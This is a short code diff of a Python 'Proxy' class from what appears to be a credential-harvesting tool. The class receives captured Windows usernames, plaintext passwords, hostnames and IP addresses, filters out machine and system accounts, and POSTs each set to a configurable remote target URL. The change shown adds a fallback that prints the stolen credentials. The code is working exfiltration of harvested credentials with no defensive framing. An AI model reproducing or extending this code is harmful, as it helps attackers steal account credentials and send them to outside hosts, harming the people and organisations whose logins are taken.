@@ -34,8 +34,8 @@ IGNORE_PASSWORD = ""
 class Proxy(Api):
     __slots__ = ("_id", "_file", "_target")
 
-    def __init__(self, target, id, url, password=None, file=None):
-        Api.__init__(self, url, password)
+    def __init__(self, api, id, target, password=None, file=None):
+        Api.__init__(self, api, password)
         self._id = id
         self._file = None
         self._target = target
@@ -85,13 +85,15 @@ class Proxy(Api):
         if u[-1] == "$" or u.startswith("UMFD-") or u.startswith("DWM-"):
             return
         if nes(IGNORE_USER) and u.startswith(IGNORE_USER) and p == IGNORE_PASSWORD:
-            return print(f'Skiping well know combo "{u}" / "{p}".', file=stderr)
+            return print(f'Skiping well known combo "{u}" / "{p}".', file=stderr)
         try:
             if nes(self._target):
                 post(
                     self._target,
                     json={"username": u, "password": p, "hostname": h, "ipaddress": w},
                 )
+            else:
+                print(f'Detected: {h} ({w}): "{u}" : "{p}"')
         except Exception as err:
             print(f'Unable to proxy Packet "{n}": {err}!', file=stderr)
         if nes(self._file):
